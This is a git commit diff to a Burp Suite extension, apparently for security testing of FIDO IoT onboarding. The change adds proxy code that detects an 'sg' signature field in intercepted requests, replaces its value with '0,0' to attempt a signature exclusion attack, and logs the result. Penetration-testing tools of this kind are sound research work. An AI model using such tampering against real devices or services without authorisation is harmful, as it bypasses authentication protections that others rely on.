543f47b76c5884d1901bae6162e5f5118744163c
amayc <churi.amay@gmail.com>
2021-07-20 20:36:21 +0200

    signature excl

--- src/main/eu/devity/burp/fidoiot/utilities/ReadMessage.java
+++ src/main/eu/devity/burp/fidoiot/utilities/ReadMessage.java
@@ -2,7 +2,11 @@ package burp;
 import java.io.PrintWriter;
 import java.net.URL;
 import java.util.List;
-
+import java.io.*;
+import java.util.*;
+import java.lang.*;
+import java.util.regex.*;
+import java.nio.charset.StandardCharsets;
 /**
  * Class to capture request to read the content of the request to identify the type of attack that can be
  * immplemented
@@ -11,6 +15,7 @@ public class ReadMessage implements  IHttpListener,IProxyListener {
 
     private final IExtensionHelpers helpers;
     private static PrintWriter stdout;
+    private int diff = 0;
 
     public ReadMessage(IBurpExtenderCallbacks callbacks) {
         this.helpers = callbacks.getHelpers();
@@ -21,23 +26,22 @@ public class ReadMessage implements  IHttpListener,IProxyListener {
 
     @Override
     public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo){
+
         if(messageIsRequest){
             IHttpService httpService = messageInfo.getHttpService();
 
-            String host = httpService.getHost();
-            int port = httpService.getPort();
             IRequestInfo requestInfo = helpers.analyzeRequest(messageInfo);
-            //private byte[] test = null;
-            String nullSG[][] = {{"sg"},{"0","0"}};
+            String request = new String(messageInfo.getRequest());
+            String messageBody = request.substring(requestInfo.getBodyOffset());
             for (IParameter param : requestInfo.getParameters()) {
+                // parameter with empty signature
                 if(param.getName().matches("sg")){
                     messageInfo.setComment("Signature excl possible");
                     messageInfo.setHighlight("red");
-                    stdout.println("Can be attacked");
-                    stdout.println(requestInfo.getUrl());
-                    stdout.println(param.getName());
-                    stdout.println(param.getValue());
-                    stdout.println("======xxx=====");
+//                    emptyArray = helpers.addParameter(emptyArray,tmpParameter);
+//                 test = helpers.updateParameter(test, tmpParameter);
+                    //messageInfo.setRequest(updateMessage);
+
                 }
             }
         }
@@ -46,17 +50,52 @@ public class ReadMessage implements  IHttpListener,IProxyListener {
 
     @Override
     public void processProxyMessage(boolean messageIsRequest, IInterceptedProxyMessage message){
+        boolean flag = false;
         if(messageIsRequest){
             IHttpRequestResponse messageInfo = message.getMessageInfo();
+
             IRequestInfo rqInfo = helpers.analyzeRequest(messageInfo);
             List headers = rqInfo.getHeaders();
-            headers.add("Test: NewHostTest");
+            headers.add("Test: BurpExHeader");
             String request = new String(messageInfo.getRequest());
             String messageBody = request.substring(rqInfo.getBodyOffset());
-            byte[] updateMessage = helpers.buildHttpMessage(headers, messageBody.getBytes());
-            messageInfo.setRequest(updateMessage);
+            for (IParameter param : rqInfo.getParameters()) {
+                // parameter with empty signature
+                if (param.getName().matches("sg")) {
+                    flag = true;
+                }
+            }
+            if(flag) {
+                Matcher m = Pattern.compile("(?=(sg))").matcher(messageBody);
+                List<Integer> pos = new ArrayList<Integer>();
+                while (m.find()) {
+                    pos.add(m.start());
+                }
+                for(int n:pos) {
+                    messageBody = modifyString(messageBody, n-diff);
+                }
+                stdout.println("Performing Signature exclusion attack");
+                stdout.println(rqInfo.getUrl());
+                byte[] updateMessage = helpers.buildHttpMessage(headers, messageBody.getBytes());
+                messageInfo.setRequest(updateMessage);
+                stdout.println(messageInfo.getResponse());
+            }
+
+        }
+        else {
+            stdout.println("");
         }
     }
 
+    public String modifyString(String msgStr, int indexStart){
+        String values = "0,0";
+        String tempStr = msgStr.substring(0,indexStart+5);
+        String truncatedStr = msgStr.substring(indexStart+6);
+        int y = truncatedStr.indexOf("]");
+        String remainStr = truncatedStr.substring(y);
+        tempStr = tempStr.concat(values).concat(remainStr);
+        diff = msgStr.length() - tempStr.length();
+        return tempStr;
+    }
 
 }
